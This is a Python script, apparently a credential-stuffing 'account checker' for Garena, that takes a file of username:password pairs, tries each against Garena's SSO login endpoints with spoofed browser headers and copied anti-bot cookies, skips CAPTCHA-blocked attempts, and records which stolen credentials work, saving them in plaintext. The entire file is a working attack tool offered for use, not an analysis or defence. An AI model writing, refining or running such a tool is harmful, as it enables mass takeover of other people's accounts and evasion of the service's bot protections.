import requests
import json
import random
import hashlib
import os
import time
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
import logging
import sys

# Initialize colorama
init(autoreset=True)

# Set up logging configuration
def setup_logging():
    # Create logs directory if it doesn't exist
    os.makedirs("logs", exist_ok=True)
    
    # Create log filename with timestamp
    log_filename = os.path.join("logs", f"account_checker_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    
    # Create formatter for file logging
    file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # Create formatter for console logging (minimal)
    console_formatter = logging.Formatter('%(message)s')
    
    # Create file handler
    file_handler = logging.FileHandler(log_filename, encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(file_formatter)
    
    # Create console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(console_formatter)
    
    # Get the root logger
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    
    # Remove any existing handlers
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)
    
    # Add handlers to logger
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    # Log initial message to verify logging is working
    logging.debug("="*50)
    logging.debug("Logging initialized")
    logging.debug(f"Log file: {log_filename}")
    logging.debug("="*50)
    
    return log_filename

def generate_md5_hash(password):
    """
    Generate the MD5 hash for a given password.
    """
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def microtime_float():
    """
    Get the current time in milliseconds.
    """
    return int(round(time.time() * 1000))

def encode_password(password_md5, v1, v2):
    """
    Encode the password using SHA-256 with given salt values.
    """
    key = hashlib.sha256(hashlib.sha256(password_md5.encode()).digest() + v1.encode()).hexdigest()
    return hashlib.sha256(hashlib.sha256(password_md5.encode()).digest() + v2.encode()).hexdigest()

def get_captcha():
    """
    Fetch a captcha image and return its key and a dummy captcha code.
    """
    keycap = hashlib.md5(str(random.random()).encode()).hexdigest()

    # Ensure the captcha directory exists
    os.makedirs("captcha", exist_ok=True)

    captcha_url = f"https://gop.captcha.garena.com/image?key={keycap}"
    captcha_image = requests.get(captcha_url).content
    with open(f"captcha/{keycap}.png", 'wb') as f:
        f.write(captcha_image)

    captcha_code = "dummy_captcha_code"
    return keycap, captcha_code

def login_and_get_session(username, password):
    """
    Perform login and return session cookies.
    """
    try:
        response = requests.post('https://sso.garena.com/api/login', data={'username': username, 'password': password})
        
        # Log all cookies set by the server after login
        print("Cookies after login:", response.cookies.get_dict())
        
        if response.status_code == 200:
            return response.cookies
        else:
            print(f"Login failed: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred during login: {str(e)}")
        return None

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_user_info(cookies, username):
    """
    Fetch user information using the session cookies.
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Referer': 'https://account.garena.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    # Debugging: Print cookies being sent
    print(f"Getting user info with cookies: {cookies}")
    
    response = requests.get("https://account.garena.com/api/account/init", cookies=cookies, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        if response.status_code == 401 and "error_session" in response.text:
            return {"error": "Session expired or invalid. Please re-login."}
        return {"error": f"Failed to retrieve user info. Status Code: {response.status_code}"}

def check_account(username, password):
    """
    Check the status of a given account by attempting to log in and fetch user info.
    """
    try:
        logging.debug(f"Starting check for account: {username}")
        base_num = "17290585"
        randomNum = base_num + str(random.randint(10000, 99999))

        hashed_password = generate_md5_hash(password)
        logging.debug(f"Generated hash for password")

        # Add more realistic headers
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'Origin': 'https://sso.garena.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        # Add more realistic cookies
        cookies = {
            '_ga': 'GA1.1.2131693347.1729053033',
            'datadome': 'orsoveoNllDRECu5DxbmPNJdoK~CmSJvvRpY1XHIfm8TjeA7QNYGL4QoiqX1m0hBbpvDKlKMQRb03HntGUhpU2JZQh8M~eW2yZ3NoQy~4H~aE4vLxui99_oTe1FGR8wF',
            '_ga_1M7M9L6VPX': 'GS1.1.1729058494.2.0.1729058494.0.0.0',
            'locale': 'en-PH',
        }

        # Step 1: Prelogin
        logging.debug(f"Attempting prelogin for {username}")
        prelogin_url = "https://sso.garena.com/api/prelogin"
        params = {
            "app_id": "10100",
            "account": username,
            "format": "json",
            "id": randomNum,
            "locale": "en-PH"
        }
        
        response = requests.get(prelogin_url, params=params, cookies=cookies, headers=headers, timeout=10)
        logging.debug(f"Prelogin response: {response.text}")

        if "captcha" in response.text.lower():
            logging.debug(f"CAPTCHA required for account: {username}")
            return f"[FAILED] {username}:{password} - CAPTCHA"

        # Step 2: Actual login
        logging.debug(f"Attempting login for {username}")
        login_url = "https://sso.garena.com/api/login"
        params = {
            'username': username,
            'password': password,
            'app_id': '10100',
            'format': 'json',
            'id': randomNum,
            'locale': 'en-PH'
        }
        
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=10)
        logging.debug(f"Login response: {response.text}")

        if "captcha" in response.text.lower():
            logging.debug(f"CAPTCHA required during login for account: {username}")
            return f"[FAILED] {username}:{password} - CAPTCHA"

        if response.status_code == 200:
            data = response.json()

            if "error" in data or data.get("error_code"):
                error_msg = data.get('error', 'Unknown error')
                logging.debug(f"Login failed for {username}: {error_msg}")
                return f"[FAILED] {username}:{password} - {error_msg}"
            else:
                session_cookies = response.cookies.get_dict()
                logging.debug(f"Login successful for {username}")
                logging.debug(f"Session cookies: {session_cookies}")
                
                user_info = get_user_info(session_cookies, username)
                
                retry_count = 0
                while "error" in user_info and user_info["error"] == "Session expired or invalid. Please re-login." and retry_count < 3:
                    logging.debug(f"Session expired for {username}, attempt {retry_count + 1}/3")
                    
                    session_cookies = login_and_get_session(username, password)
                    if session_cookies is None:
                        logging.debug(f"Failed to refresh session for {username}")
                        return f"[FAILED] {username}:{password} - Session Error"
                    
                    user_info = get_user_info(session_cookies, username)
                    retry_count += 1

                if "error" in user_info and user_info["error"] == "Session expired or invalid. Please re-login.":
                    logging.debug(f"All session refresh attempts failed for {username}")
                    return f"[FAILED] {username}:{password} - Session Error"
                
                logging.debug(f"Successfully retrieved user info for {username}")
                return f"[SUCCESS] {username}:{password}"

        else:
            logging.debug(f"HTTP error {response.status_code} for {username}")
            return f"[FAILED] {username}:{password} - HTTP {response.status_code}"

    except Exception as e:
        logging.debug(f"Exception occurred while checking {username}: {str(e)}", exc_info=True)
        return f"[ERROR] {username}:{password} - {str(e)}"

def bulk_check(input_file, output_file):
    """
    Perform bulk account checking using an input file and save results to an output file.
    """
    successful_count = 0
    failed_count = 0

    logging.debug(f"Starting bulk check with input file: {input_file}")
    logging.debug(f"Results will be saved to: {output_file}")

    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
        # Filter out empty lines and strip whitespace
        accounts = [line.strip() for line in infile.readlines() if line.strip()]
        total_accounts = len(accounts)
        logging.debug(f"Found {total_accounts} valid accounts to check")

        # Create progress bar with position=0 to ensure it stays at the top
        pbar = tqdm(accounts, desc="Checking", unit="acc", position=0, leave=True)
        
        results = []  # Store results to print after progress bar
        
        for acc in pbar:
            if ':' in acc:
                username, password = acc.split(':', 1)  # Split only on first colon
                logging.debug(f"Processing account: {username}")
                result = check_account(username, password)
                results.append(result)  # Store result
                outfile.write(result + '\n')

                if "SUCCESS" in result:
                    successful_count += 1
                    logging.debug(f"Account {username} check successful")
                else:
                    failed_count += 1
                    logging.debug(f"Account {username} check failed")
            else:
                error_msg = f"Invalid format: {acc}"
                logging.debug(error_msg)
                results.append(error_msg)
                outfile.write(error_msg + '\n')
                failed_count += 1

            time.sleep(1)
        
        # Clear the progress bar
        pbar.close()
        
        # Print all results after progress bar is done
        print("\nResults:")
        for result in results:
            print(result)

    summary = f"\nTotal Successful: {successful_count}\nTotal Failed: {failed_count}"
    logging.debug(summary)
    print(f"\nSuccess: {successful_count} | Failed: {failed_count}")

def display_banner():
    """
    Display the program banner.
    """
    banner = f"""{Fore.RED}
   ___ _               _
  / __\ |__   ___  ___| | _____ _ __
 / /  | '_ \ / _ \/ __| |/ / _ \ '__|
/ /___| | | |  __/ (__|   <  __/ |
\____/|_| |_|\___|\___|_|\_\___|_|

    ___
   / _ \__ _ _ __ ___ _ __   __ _
  / /_\/ _` | '__/ _ \ '_ \ / _` |
 / /_/\ (_| | | |  __/ | | | (_| |
 \____/\__,_|_|  \___|_| |_|\__,_|
    {Fore.YELLOW}Author @Shin{Fore.RESET}
    """
    print(banner)

if __name__ == "__main__":
    try:
        log_filename = setup_logging()
        logging.debug("Starting Account Checker")
        
        display_banner()
        logging.debug("Displayed program banner")

        input_file = input(Fore.MAGENTA + "ᴇɴᴛᴇʀ Fɪʟᴇɴᴀᴍᴇ ᴡɪʟʟ ᴄʜᴇᴄᴋ: ")
        output_file = input(Fore.MAGENTA + "ᴇɴᴛᴇʀ Fɪʟᴇɴᴀᴍᴇ ᴛᴏ ꜱᴀᴠᴇ ɪᴛ: ")
        
        logging.debug(f"Input file: {input_file}")
        logging.debug(f"Output file: {output_file}")

        bulk_check(input_file, output_file)
        logging.debug(f"Program completed. Log file: {log_filename}")
    except Exception as e:
        logging.debug(f"Critical error occurred: {str(e)}", exc_info=True)
        print(Fore.RED + f"An error occurred: {str(e)}")
        sys.exit(1)